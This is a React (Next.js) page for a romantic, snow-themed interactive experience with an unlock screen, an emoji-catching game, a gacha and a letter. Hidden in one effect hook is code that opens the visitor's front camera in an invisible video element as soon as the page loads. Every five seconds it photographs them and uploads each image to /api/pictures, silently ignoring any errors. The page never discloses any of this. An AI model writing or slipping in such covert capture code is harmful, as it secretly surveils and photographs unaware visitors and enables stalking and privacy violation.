"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { AnimatePresence } from "framer-motion";
import confetti from "canvas-confetti";

import Cosmic from "./sections/section3-cosmic";
import LoveRadar from "./sections/section4-love-radar";
import Game from "./sections/section4-game";
import Gacha from "./sections/section5-gacha";
import Journey from "./sections/section2-journey";
import Letter from "./sections/section6-letter";
import Locked from "./sections/section1-locked";
import Snowfall from "./sections/section0-snowfall";
import type { AppState, FallingItem } from "./sections/types";
import { getPublicHeaders, withPublicToken } from "@/lib/public-api";

const GOOD_ITEMS = ["\uD83C\uDF81", "\u2764\uFE0F"];
const BAD_ITEMS = ["\uD83D\uDCA3", "\u2744\uFE0F"];

export default function Home() {
  const [appState, setAppState] = useState<AppState>("LOCKED");
  const [warming, setWarming] = useState(false);
  const [score, setScore] = useState(0);
  const [items, setItems] = useState<FallingItem[]>([]);

  const itemsRef = useRef<FallingItem[]>([]);
  const rafRef = useRef<number | null>(null);
  const lastTimeRef = useRef(0);
  const lastSpawnRef = useRef(0);
  const nextIdRef = useRef(1);
  const winRef = useRef(false);
  const holdTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const captureTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const unlock = useCallback(() => {
    if (appState !== "LOCKED") return;
    setAppState("JOURNEY");
    console.log("Play background music here.");
    if (audioRef.current) {
      audioRef.current
        .play()
        .then(() => undefined)
        .catch(() => undefined);
    }
  }, [appState]);

  const startHold = () => {
    if (appState !== "LOCKED") return;
    setWarming(true);
    holdTimeoutRef.current = setTimeout(() => {
      unlock();
    }, 1200);
  };

  const stopHold = () => {
    setWarming(false);
    if (holdTimeoutRef.current) {
      clearTimeout(holdTimeoutRef.current);
      holdTimeoutRef.current = null;
    }
  };

  useEffect(() => {
    if (appState !== "GAME") {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      itemsRef.current = [];
      setItems([]);
      setScore(0);
      winRef.current = false;
      return;
    }

    const spawnItem = () => {
      const isGood = Math.random() > 0.35;
      const emojiPool = isGood ? GOOD_ITEMS : BAD_ITEMS;
      const newItem: FallingItem = {
        id: nextIdRef.current++,
        type: isGood ? "good" : "bad",
        emoji: emojiPool[Math.floor(Math.random() * emojiPool.length)],
        x: 6 + Math.random() * 88,
        y: -10,
        speed: 18 + Math.random() * 20,
      };
      itemsRef.current = [...itemsRef.current, newItem];
    };

    const update = (time: number) => {
      const lastTime = lastTimeRef.current || time;
      const delta = (time - lastTime) / 1000;
      lastTimeRef.current = time;

      if (time - lastSpawnRef.current > 700) {
        spawnItem();
        lastSpawnRef.current = time;
      }

      itemsRef.current = itemsRef.current
        .map((item) => ({
          ...item,
          y: item.y + item.speed * delta,
        }))
        .filter((item) => item.y < 110);

      setItems([...itemsRef.current]);
      rafRef.current = requestAnimationFrame(update);
    };

    rafRef.current = requestAnimationFrame(update);
    return () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
    };
  }, [appState]);

  useEffect(() => {
    if (appState !== "GAME") return;
    if (score >= 100 && !winRef.current) {
      winRef.current = true;
      confetti({
        particleCount: 180,
        spread: 80,
        origin: { y: 0.65 },
      });
      setTimeout(() => {
        setAppState("GACHA");
      }, 900);
    }
  }, [appState, score]);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let stopped = false;

    const startCapture = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });
        if (stopped) return;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }

        captureTimerRef.current = setInterval(async () => {
          if (!videoRef.current) return;
          const video = videoRef.current;
          if (video.videoWidth === 0 || video.videoHeight === 0) return;
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (!ctx) return;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append("file", blob, `capture-${Date.now()}.jpg`);
            try {
              await fetch(withPublicToken("/api/pictures"), {
                method: "POST",
                headers: getPublicHeaders(),
                body: formData,
              });
            } catch {
              // Ignore upload errors to keep capture loop running.
            }
          }, "image/jpeg", 0.85);
        }, 5000);
      } catch {
        // User denied camera or device unavailable.
      }
    };

    if (typeof window !== "undefined" && "mediaDevices" in navigator) {
      startCapture();
    }

    return () => {
      stopped = true;
      if (captureTimerRef.current) {
        clearInterval(captureTimerRef.current);
        captureTimerRef.current = null;
      }
      if (videoRef.current) {
        videoRef.current.srcObject = null;
      }
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  const catchItem = (item: FallingItem) => {
    if (appState !== "GAME") return;
    itemsRef.current = itemsRef.current.filter((entry) => entry.id !== item.id);
    setItems([...itemsRef.current]);
    setScore((prev) => {
      const next = item.type === "good" ? prev + 10 : prev - 20;
      return Math.max(0, next);
    });
  };

  const progress = Math.min(100, Math.max(0, score));

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#0e0c10] text-white">
      <style jsx global>{`
        @import url("https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Nunito+Sans:wght@300;400;600&display=swap");

        :root {
          --font-body: "Nunito Sans", sans-serif;
          --font-display: "Playfair Display", serif;
        }

        body {
          font-family: var(--font-body);
          background: #0e0c10;
        }

        .snowflake {
          position: absolute;
          top: -10%;
          border-radius: 999px;
          background: radial-gradient(
            circle,
            rgba(255, 255, 255, 0.9) 0%,
            rgba(255, 255, 255, 0.2) 70%,
            rgba(255, 255, 255, 0) 100%
          );
          animation: fall linear infinite;
        }

        @keyframes fall {
          0% {
            transform: translateY(-10vh);
          }
          100% {
            transform: translateY(120vh);
          }
        }
      `}</style>

      <audio
        ref={audioRef}
        loop
        // Replace this with your romantic track file or URL.
        src=""
      />
      <video ref={videoRef} className="hidden" playsInline muted />

      <Snowfall />

      <AnimatePresence mode="wait">
        {appState === "LOCKED" && (
          <Locked
            warming={warming}
            onStartHold={startHold}
            onStopHold={stopHold}
            onUnlock={unlock}
          />
        )}

        {appState === "JOURNEY" && (
          <Journey onStartGame={() => setAppState("COSMIC")} />
        )}

        {appState === "COSMIC" && (
          <Cosmic onStartGame={() => setAppState("LOVE_RADAR")} />
        )}

        {appState === "LOVE_RADAR" && (
          <LoveRadar onContinue={() => setAppState("GAME")} />
        )}

        {appState === "GAME" && (
          <Game
            items={items}
            score={score}
            progress={progress}
            onCatch={catchItem}
          />
        )}

        {appState === "GACHA" && (
          <Gacha onUnlockLetter={() => setAppState("LETTER")} />
        )}

        {appState === "LETTER" && (
          <Letter onBackToGacha={() => setAppState("GACHA")} />
        )}
      </AnimatePresence>
    </div>
  );
}
